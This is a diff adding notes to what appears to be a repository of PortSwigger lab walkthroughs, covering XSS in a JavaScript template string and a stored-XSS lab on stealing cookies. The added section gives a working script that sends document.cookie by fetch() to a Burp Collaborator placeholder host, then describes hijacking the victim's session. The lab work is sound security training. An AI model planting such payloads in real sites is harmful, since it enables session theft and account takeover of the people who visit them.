@@ -417,3 +417,33 @@ Submit a random alphanumeric string in the search box, then use Burp Suite to in
 Observe that the random string has been reflected inside a JavaScript template string.
 Replace your input with the following payload to execute JavaScript inside the template string: ${alert(1)}
 Verify the technique worked by right clicking, selecting "Copy URL", and pasting the URL in the browser. When you load the page it should trigger an alert.
+
+![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/7e58ce12-e161-49eb-88e8-e202d07b6447)
+
+![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/6235bd07-b7b1-4f0d-930d-12d2d25d7b5d)
+
+![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/bef08dbf-206a-4b5a-88a4-66d1b2eb27bf)
+
+![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/e7f08ebc-ed09-4c6d-8f07-10e3e6ddb14a)
+
+**Lab: Exploiting cross-site scripting to steal cookies**
+
+This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.
+
+Using Burp Suite Professional, go to the Collaborator tab.
+Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
+Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated:
+
+<script>
+fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+</script>
+This script will make anyone who views the comment issue a POST request containing their cookie to your subdomain on the public Collaborator server.
+
+Go back to the Collaborator tab, and click "Poll now". You should see an HTTP interaction. If you don't see any interactions listed, wait a few seconds and try again.
+Take a note of the value of the victim's cookie in the POST body.
+Reload the main blog page, using Burp Proxy or Burp Repeater to replace your own session cookie with the one you captured in Burp Collaborator. Send the request to solve the lab. To prove that you have successfully hijacked the admin user's session, you can use the same cookie in a request to /my-account to load the admin user's account page.
+
